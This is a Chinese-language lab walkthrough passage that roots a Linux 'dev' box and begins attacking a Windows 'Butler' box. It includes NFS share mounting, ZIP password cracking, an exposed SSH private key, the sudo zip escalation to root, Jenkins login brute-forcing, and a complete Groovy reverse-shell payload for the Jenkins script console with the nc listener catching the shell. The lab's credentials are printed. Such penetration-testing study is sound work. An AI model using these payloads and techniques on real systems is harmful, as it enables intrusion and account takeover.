(admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">**jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash**</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>看起來這邊只有一個用戶<strong>jeanpaul，嘗試用ssh登入</strong></p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jeanpaul@192.168.19.142** </span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">jeanpaul@192.168.19.142<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>
<ul>
<li>這邊可以嘗試 brute forcing key id_rsa，如果是弱密碼就有機會爆破出</li>
<li>也可以嘗試之前找到的db資料 &gt; password: I_love_java 試試</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jeanpaul@192.168.19.142**</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: **I_love_java** </span><br><span class="line">Linux dev 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">ls</span></span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/jeanpaul</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">history</span> </span><br><span class="line">    1  <span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; .bash_history </span><br><span class="line">    2  <span class="built_in">sudo</span> -l</span><br><span class="line">    3  <span class="built_in">exit</span></span><br><span class="line">    4  <span class="built_in">ls</span></span><br><span class="line">    5  <span class="built_in">pwd</span></span><br><span class="line">    6  <span class="built_in">history</span></span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jeanpaul on dev:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jeanpaul may run the following commands on dev:</span><br><span class="line">    **(root) NOPASSWD: /usr/bin/zip**</span><br></pre></td></tr></table></figure>
<ul>
<li><p>用sudo zip去進行權限提升，在有限的root權限指令下進行提權</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
<li>進入網頁點選 sudo&gt;找到zip&gt;</li>
</ul>
<p>  <img src="/img/privilege_Untitled_22.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**jeanpaul@dev:~$ TF=$(<span class="built_in">mktemp</span> -u)</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">sudo</span> zip <span class="variable">$TF</span> /etc/hosts -T -TT <span class="string">&#x27;sh #&#x27;</span>**</span><br><span class="line">  adding: etc/hosts (deflated 31%)</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># sudo -l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> root on dev:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User root may run the following commands on dev:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line"><span class="comment"># cd /root      </span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">Congratz on rooting this box !</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>nfs &gt;</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://kalitut.com/mount-nfs-share/">https://kalitut.com/mount-nfs-share/</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting</a></li>
</ul>
</li>
<li><p>查詢目標機器上的NFS(Network File System)共享的輸出結果</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **showmount -e** 192.168.19.142</span><br><span class="line">Export list <span class="keyword">for</span> 192.168.19.142:</span><br><span class="line">/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16</span><br><span class="line"><span class="comment">#這台主機上的NFS共享目錄為/srv/nfs</span></span><br></pre></td></tr></table></figure>

<p>此共享目錄允許以下範圍的IP地址進行訪問：</p>
<ul>
<li>172.16.0.0&#x2F;12：表示172.16.0.0至172.31.255.255的IP範圍。</li>
<li>10.0.0.0&#x2F;8：表示10.0.0.0至10.255.255.255的IP範圍。</li>
<li>192.168.0.0&#x2F;16：表示192.168.0.0至192.168.255.255的IP範圍。</li>
</ul>
<p>換句話說，這個NFS共享只允許來自這些IP範圍的主機訪問。</p>
<p>成功將目標機器上&#x2F;srv&#x2F;nfs共享目錄掛載到了本地(攻擊者)系統上，並且可以在&#x2F;mnt&#x2F;dev目錄中訪問該共享目錄中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">mkdir</span> /mnt/dev</span><br><span class="line">                                                                                                                                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# mount -t nfs 192.168.19.142:/srv/nfs /mnt/dev</span><br><span class="line"><span class="comment">#從192.168.19.142主機掛載了一個NFS共享目錄到本地系統的/mnt/dev目錄</span></span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cd</span> /mnt/dev          </span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# <span class="built_in">ls</span>                </span><br><span class="line">save.zip</span><br><span class="line"><span class="comment">#進入了/mnt/dev目錄並列出了其中的文件，發現有一個名為save.zip的文件。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>找到文件後嘗試解壓縮發現需要密碼但目前沒有</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# unzip save.zip </span><br><span class="line">Archive:  save.zip</span><br><span class="line">[save.zip] id_rsa password: </span><br><span class="line">   skipping: id_rsa                  incorrect password</span><br><span class="line">   skipping: todo.txt                incorrect password</span><br></pre></td></tr></table></figure>

<ul>
<li>嘗試破解ZIP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# apt install fcrackzip       </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  fcrackzip</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip </span><br><span class="line">found file <span class="string">&#x27;id_rsa&#x27;</span>, (size <span class="built_in">cp</span>/uc   1435/  1876, flags 9, chk 2a0d)</span><br><span class="line">found file <span class="string">&#x27;todo.txt&#x27;</span>, (size <span class="built_in">cp</span>/uc    138/   164, flags 9, chk 2aa1)</span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == java101</span><br><span class="line"></span><br><span class="line"><span class="comment"># -v 詳細模式（Verbose mode）提供額外的細節</span></span><br><span class="line"><span class="comment"># -u 破解zip檔案</span></span><br><span class="line"><span class="comment"># -D using a dictionary attack</span></span><br><span class="line"><span class="comment"># -p using file in order to attack</span></span><br></pre></td></tr></table></figure>

<ul>
<li>找到密碼並解壓縮</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **unzip save.zip**                                                 </span><br><span class="line">Archive:  save.zip</span><br><span class="line">[save.zip] id_rsa password: </span><br><span class="line">  inflating: id_rsa                  </span><br><span class="line">  inflating: todo.txt                </span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **<span class="built_in">ls</span>**</span><br><span class="line">id_rsa  save.zip  todo.txt</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **<span class="built_in">cat</span> todo.txt** </span><br><span class="line">- Figure out how to install the main website properly, the config file seems correct...</span><br><span class="line">- Update development website</span><br><span class="line">- Keep coding <span class="keyword">in</span> Java because it<span class="string">&#x27;s awesome</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**jp**</span></span><br><span class="line"><span class="string">                                                                                                                                       </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/mnt/dev]</span></span><br><span class="line"><span class="string">└─# **cat id_rsa**  </span></span><br><span class="line"><span class="string">-----BEGIN OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea</span></span><br><span class="line"><span class="string">0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4</span></span><br><span class="line"><span class="string">0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj</span></span><br><span class="line"><span class="string">3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq</span></span><br><span class="line"><span class="string">S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n</span></span><br><span class="line"><span class="string">Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC</span></span><br><span class="line"><span class="string">xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG</span></span><br><span class="line"><span class="string">ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1</span></span><br><span class="line"><span class="string">tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI</span></span><br><span class="line"><span class="string">EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7</span></span><br><span class="line"><span class="string">ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY</span></span><br><span class="line"><span class="string">SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u</span></span><br><span class="line"><span class="string">dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh</span></span><br><span class="line"><span class="string">wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+</span></span><br><span class="line"><span class="string">AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b</span></span><br><span class="line"><span class="string">rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud</span></span><br><span class="line"><span class="string">T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc</span></span><br><span class="line"><span class="string">753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT</span></span><br><span class="line"><span class="string">hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E</span></span><br><span class="line"><span class="string">PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+</span></span><br><span class="line"><span class="string">rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4</span></span><br><span class="line"><span class="string">+e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC</span></span><br><span class="line"><span class="string">LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z</span></span><br><span class="line"><span class="string">iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/</span></span><br><span class="line"><span class="string">gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ</span></span><br><span class="line"><span class="string">q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=</span></span><br><span class="line"><span class="string">-----END OPENSSH PRIVATE KEY-----</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>id_rsa  可以連線到SSH，利用這檔案連線到 <code>jp</code> 用戶，但目前還不知道密碼</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jp@192.168.19.142**                                 </span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.19.142 (192.168.19.142)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes </span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.19.142<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">jp@192.168.19.142&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">jp@192.168.19.142<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>

<h3 id="Walkthrough-Butler"><a href="#Walkthrough-Butler" class="headerlink" title="Walkthrough - Butler"></a><strong>Walkthrough - Butler</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Added fix <span class="keyword">for</span> NIC Power Management</span><br><span class="line"></span><br><span class="line">Added fix <span class="keyword">for</span> ServicesPipeTimeout</span><br><span class="line"> - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control</span><br><span class="line">   - New RegKey ServicesPipeTimeout</span><br><span class="line">   - New DWORD Value (32bit)</span><br><span class="line">     - Decimal 18000</span><br><span class="line"></span><br><span class="line">Disabled Windows Firewall </span><br><span class="line">Disabled Windows Defender AV </span><br><span class="line">Disabled Windows Update </span><br><span class="line">Removed any existing Windows Updates</span><br></pre></td></tr></table></figure>

<ul>
<li>Low Privilege User - butler:JeNkIn5@44</li>
<li>Admin - administrator:A%rc!BcA!</li>
<li>ip - 192.168.19.142</li>
</ul>
<p>查看到網頁8080port先去開網頁查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -T4 -A -p- 192.168.19.143</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 00:31 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.143</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">**135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5040/tcp  open  unknown</span><br><span class="line">7680/tcp  open  pando-pub?</span><br><span class="line">8080/tcp  open  http          Jetty 9.4.41.v20210516**</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Jetty(9.4.41.v20210516)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html;charset=utf-8).</span></span><br><span class="line"><span class="string">49664/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49665/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49667/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49668/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49670/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:26:C4:D4 (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Microsoft Windows 10</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:microsoft:windows_10</span></span><br><span class="line"><span class="string">OS details: Microsoft Windows 10 1709 - 1909</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_nbstat: NetBIOS name: BUTLER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:26:c4:d4 (VMware)</span></span><br><span class="line"><span class="string">|_clock-skew: 15h59m58s</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2024-02-17T21:34:18</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   3:1:1: </span></span><br><span class="line"><span class="string">|_    Message signing enabled but not required</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   0.95 ms 192.168.19.143</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 198.01 seconds</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看網頁open source也沒有發現特別可以利用的東西</li>
</ul>
<p><img src="/img/privilege_Untitled_23.png" alt="Untitled"></p>
<ul>
<li>查找Jenkins漏洞</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a></p>
<ul>
<li><p>查看jenkins default passwd</p>
<ul>
<li>admin&#x2F;password</li>
<li>嘗試用它做利用</li>
</ul>
<p>  <img src="/img/privilege_Untitled_24.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_25.png" alt="Untitled">
  </p>
</li>
<li><p>嘗試7680 port的開啟，不確定這port用途可以開goole查看或網頁開啟試試</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **apt install telnet**</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">telnet is already the newest version (0.17+2.5-3).</span><br><span class="line">telnet <span class="built_in">set</span> to manually installed.</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 123 not upgraded.</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# telnet 192.168.19.143 7680</span><br><span class="line">Trying 192.168.19.143...</span><br><span class="line">telnet: Unable to connect to remote host: Connection refused</span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_26.png" alt="Untitled"></p>
<ul>
<li>brute force Jenkins</li>
</ul>
<p>通過foxyproxy攔截封包 &gt; Intruder &amp; Repeater</p>
<p><img src="/img/privilege_Untitled_27.png" alt="Untitled"></p>
<ul>
<li>Intruder 當有兩參數時，可以選擇要Pitchfork還是Cluster bomb</li>
<li>兩者差異主要是<ul>
<li>Pitchfork &gt; 1 to 1<ul>
<li>帳號 vs 密碼，順序比對</li>
</ul>
</li>
<li>Cluster bomb &gt; 1 to all<ul>
<li>一帳號 vs 全密碼依序比對</li>
</ul>
</li>
</ul>
</li>
<li>這邊選擇Cluster bomb，因為我們不確定admin跟passwd的任何一方</li>
</ul>
<p><img src="/img/privilege_Untitled_28.png" alt="Untitled"></p>
<p>輸入極有可能會出現的帳號及密碼</p>
<p><img src="/img/privilege_Untitled_29.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_30.png" alt="Untitled"></p>
<p>通過查看爆破後的長度，會發現有一個特別不一樣，嘗試登入</p>
<ul>
<li>通過比對長度不同的網頁回應會看到兩者有些許差異</li>
</ul>
<p><img src="/img/privilege_Untitled_31.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_32.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_33.png" alt="Untitled"></p>
<p>成功登入後看到Jenkins版本 &gt; 2.289.3，這對滲透測試來說是不錯的訊息</p>
<p><img src="/img/privilege_Untitled_34.png" alt="Untitled"></p>
<p>也通過hacktricks告訴我們的資訊，嘗試利用</p>
<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security</a></p>
<p>察看到這邊有很多功能</p>
<ul>
<li>注意到CLI，也許可以用它運行shell</li>
<li>script console &gt; Groovy script，前面在做資訊蒐集時有看到Groovy似乎是能拿來利用</li>
</ul>
<p><img src="/img/privilege_Untitled_35.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_36.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_37.png" alt="Untitled"></p>
<p>查詢google &gt; Groovy script exploit </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a></li>
<li><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6">https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6</a></li>
<li><a target="_blank" rel="noopener" href="https://coldfusionx.github.io/posts/Groovy_RCE/">https://coldfusionx.github.io/posts/Groovy_RCE&#x2F;</a></li>
</ul>
<p>可以通過一些Reverse shell利用，貼到script console中，並開啟nc監聽，再console中運行下列指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">&quot;localhost&quot;</span>; <span class="comment">#換成attacker IP</span></span><br><span class="line">int port=8044;</span><br><span class="line">String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(<span class="literal">true</span>).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;0)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;0)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.<span class="built_in">sleep</span>(50);try &#123;p.exitValue();<span class="built_in">break</span>;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_38.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 8044**                 </span><br><span class="line">listening on [any] 8044 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.143] 49724</span><br><span class="line">Microsoft Windows [Version 10.0.19043.928]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Program Files\Jenkins&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">butler\butler</span><br></pre></td></tr></table></figure>

<ul>
<li>我們不是最高權限用戶，嘗試提權</li>
</ul>
<p>查看該機器資訊 <code>systeminfo</code> 版本資訊可以尋找該版本是否有利用點</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Jenkins&gt;**systeminfo**</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 BUTLER</span><br><span class="line">OS Name:                   Microsoft Windows 10 Enterprise Evaluation</span><br><span class="line">**OS Version:                10.0.19043 N/A Build 19043**</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          butler</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00329-20000-00001-AA079</span><br><span class="line">Original Install Date:     8/14/2021, 3:51:38 AM</span><br><span class="line">System Boot Time:          2/16/2024, 10:49:03 PM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 96 Stepping 1 AuthenticAMD ~2895 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 96 Stepping 1 AuthenticAMD ~2895 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.16722896.B64.2008100651, 8/10/2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 1,545 MB</span><br><span class="line">Virtual Memory: Max Size:  3,199 MB</span><br><span class="line">Virtual Memory: Available: 2,260 MB</span><br><span class="line">Virtual Memory: In Use:    939 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    WORKGROUP</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 4 Hotfix(s) Installed.</span><br><span class="line">                           [01]: KB4601554</span><br><span class="line">                           [02]: KB5000736</span><br><span class="line">                           [03]: KB5001330</span><br><span class="line">                           [04]: KB5001405</span><br><span class="line">Network 